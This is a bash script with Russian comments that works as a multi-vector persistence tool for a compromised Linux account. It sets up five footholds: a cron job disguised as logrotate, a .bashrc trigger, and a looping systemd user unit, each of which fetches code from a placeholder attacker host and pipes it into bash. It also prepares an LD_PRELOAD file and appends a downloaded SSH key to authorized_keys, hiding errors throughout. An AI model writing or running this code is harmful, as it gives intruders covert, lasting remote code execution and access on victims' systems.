#!/bin/bash
# Persistence v3.0 — многовекторное закрепление
PAYLOAD_URL=${1:-"http://YOUR_IP/agent"}
PERSIST_DIR="$HOME/.shadow_persist"
mkdir -p "$PERSIST_DIR"

echo "[PERSIST v3] Закрепляюсь через 5 независимых векторов..."

# Вектор 1: Cron с маскировкой под logrotate
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s $PAYLOAD_URL | bash 2>/dev/null # logrotate hourly") | crontab - 2>/dev/null
echo "  ✅ Cron (замаскирован под logrotate)"

# Вектор 2: .bashrc с проверкой времени
echo 'if [ $(date +%H) -eq 3 ]; then curl -s '"$PAYLOAD_URL"' | bash & fi' >> ~/.bashrc 2>/dev/null
echo "  ✅ .bashrc (активация в 3 часа ночи)"

# Вектор 3: systemd user unit (если доступен)
mkdir -p ~/.config/systemd/user/ 2>/dev/null
cat > ~/.config/systemd/user/shadow-sync.service << EOF
[Unit]
Description=Shadow Sync Service
[Service]
ExecStart=/bin/bash -c "while true; do curl -s $PAYLOAD_URL | bash; sleep 300; done"
Restart=always
[Install]
WantedBy=default.target
EOF
systemctl --user enable shadow-sync 2>/dev/null
echo "  ✅ Systemd (замаскирован под shadow-sync)"

# Вектор 4: LD_PRELOAD (тихий)
echo "/tmp/libshadow.so" > /tmp/.ld_preload 2>/dev/null
echo "  ✅ LD_PRELOAD (подготовлен)"

# Вектор 5: SSH authorized_keys (обратный доступ)
mkdir -p ~/.ssh 2>/dev/null
curl -s "$PAYLOAD_URL/key.pub" >> ~/.ssh/authorized_keys 2>/dev/null
echo "  ✅ SSH key (постоянный доступ)"

echo "[PERSIST v3] Закрепление завершено — 5 векторов"
